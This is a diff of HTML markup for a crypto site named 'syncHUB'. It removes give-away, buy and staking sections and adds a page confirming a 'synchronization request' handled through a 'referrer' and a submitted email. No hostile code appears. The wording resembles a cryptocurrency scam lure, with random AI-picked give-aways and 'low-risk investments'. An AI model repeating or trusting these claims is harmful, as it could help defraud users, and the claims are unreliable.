-                                    <p>At syncHUB, we occasionally do give-aways AND gift sharings for our client whom are randomly picked by our AI systems </p>
-                                    <a class="read_more" style="margin-top: 20px;" href="index.html">Get Started</a>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
-    <div class="about">
-        <div class="container">
-            <div class="row">
-                <div class="col-md-12">
-                    <div class="about_border">
-                        <div class="row">
-                            <div class="col-md-12">
-                                <div class="titlepage text_align_left">
-                                    <h2>BUY HERE</h2>
-                                </div>
-                                <div style="margin-top:20px">
-                                    <p>We sell all sort of cryptocurrencies and NFT tokens</p>
-                                    <a class="read_more" style="margin-top: 20px;" href="index.html">Get Started</a>
-                                </div>
-                            </div>
-                        </div>
-                    </div>
-                </div>
-            </div>
-        </div>
-    </div>
+                                <div class="about_text">
+                                    <p>Your synchroniztion request has been received and our work has started
+                                        immediately,
+                                        it takes
+                                        24hrs-96hrs.Contact your referrer for any tips.</p>
+                                    <p> We will
+                                        contact you to refer you to one of our online representatives when completed on
+                                        this
+                                        email below, which you submitted</p>
+                                    <h3 id="mymail"
+                                        style="color: white;font-weight: bold; margin-top: 30px;margin-bottom: 30px;">
+                                    </h3>
 
-    <div class="about">
-        <div class="container">
-            <div class="row">
-                <div class="col-md-12">
-                    <div class="about_border">
-                        <div class="row">
-                            <div class="col-md-12">
-                                <div class="titlepage text_align_left">
-                                    <h2>STAKE HERE</h2>
+                                    <a class="read_more" href="">syncHUB</a>
                                 </div>
-                                <div style="margin-top:20px">
-                                    <p>Be a part of the syncHUB owners family with low-risk investments in crpto assets and tokens</p>
-                                    <a class="read_more" style="margin-top: 20px;" href="index.html">Get Started</a>
+                            </div>
+                            <div class="col-md-6">
+                                <div class="about_img">
+                                    <figure><img class="img_responsive" src="images/about2.png" alt="#" /></figure>
                                 </div>
                             </div>
                         </div>
@@ -184,8 +651,7 @@
             </div>
         </div>
     </div>
-</div>
-    <!-- end about -->
+    <!--end-->
 
     <!-- footer -->
     <footer>
